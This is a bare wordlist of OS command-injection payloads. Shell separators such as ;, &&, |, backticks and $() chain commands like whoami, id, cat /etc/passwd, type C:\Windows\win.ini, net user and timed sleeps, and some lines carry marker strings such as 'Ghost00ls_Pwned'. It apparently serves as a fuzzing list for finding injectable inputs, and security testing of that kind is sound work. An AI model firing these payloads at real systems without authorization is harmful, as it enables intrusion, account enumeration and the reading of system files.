;id
&&id
|id
;whoami
|whoami
&&cat /etc/passwd
;uname -a
&&ls
|ls -la
&&echo Ghost00ls_Pwned
;ping -c 1 127.0.0.1
|sleep 1
||sleep 2
&&powershell whoami
|dir
&net user
&&type C:\Windows\win.ini
;echo GHOST_TEST
;id;uname -a
||whoami
`whoami`
$(whoami)
;cat /etc/hosts
;curl -I http://example.com
